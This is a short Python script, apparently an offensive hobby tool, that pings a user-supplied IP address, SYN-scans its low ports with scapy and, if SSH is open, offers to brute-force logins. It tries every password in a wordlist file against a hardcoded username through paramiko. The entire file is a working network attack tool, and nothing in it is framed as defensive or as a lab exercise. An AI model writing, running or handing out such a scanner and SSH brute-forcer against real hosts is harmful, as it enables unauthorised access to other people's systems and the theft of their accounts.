import paramiko
from scapy.all import *


target = input("What is your target today? [IP]:  ")
registered_ports = range(1, 1023)
open_ports = []


def scan_port(port: int):
    source_port = RandShort()
    conf.verb = 0
    sync_packet = sr1(
        IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5
    )
    if not sync_packet:
        return False

    if not sync_packet.haslayer(TCP):
        return False

    SYN_ACK = 0x12
    if sync_packet[TCP].flags == SYN_ACK:
        print(f"Port {port} is open")
        sr(IP(dst=target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2)
        return True
    return False


def target_avaliable():
    conf.verb = 0
    try:
        icmp_pkt = sr1(IP(dst=target) / ICMP(), timeout=3)
    except Exception as e:
        print(e)
        return False
    return True if icmp_pkt else False


def brut_force(port: int):
    print("[INFO] Start BF")
    with open("password_list.txt", "r") as f:
        passwords = [p.rstrip("\n") for p in f.readlines()]
        user = "user_i_dont_like"
        ssh_conn = paramiko.SSHClient()
        ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in passwords:
            try:
                ssh_conn.connect(
                    target, port=int(port), username=user, password=password, timeout=1
                )
                print(f"[SUCCESS] Password: {password}")
                ssh_conn.close()
                break
            except Exception as e:
                print(e)
                print(f"[FAILED] Password: {password}")


if target_avaliable():
    print("[INFO] Target avaliable")
    print("[INFO] Start scanning...")
    for p in registered_ports:
        status = scan_port(p)
        if status:
            open_ports.append(p)
    print(f"[INFO] Saning of target {target} finished")
    if 22 in open_ports:
        print("[INFO] Port 22 is open")
        while True:
            try_brut_force = input(">>> Wanna try BF attack [Y/N]: ")
            if try_brut_force.upper() == "Y":
                brut_force(22)
                break
            elif try_brut_force.upper() == "N":
                break
    print(f"[INFO] Open ports: {open_ports}")
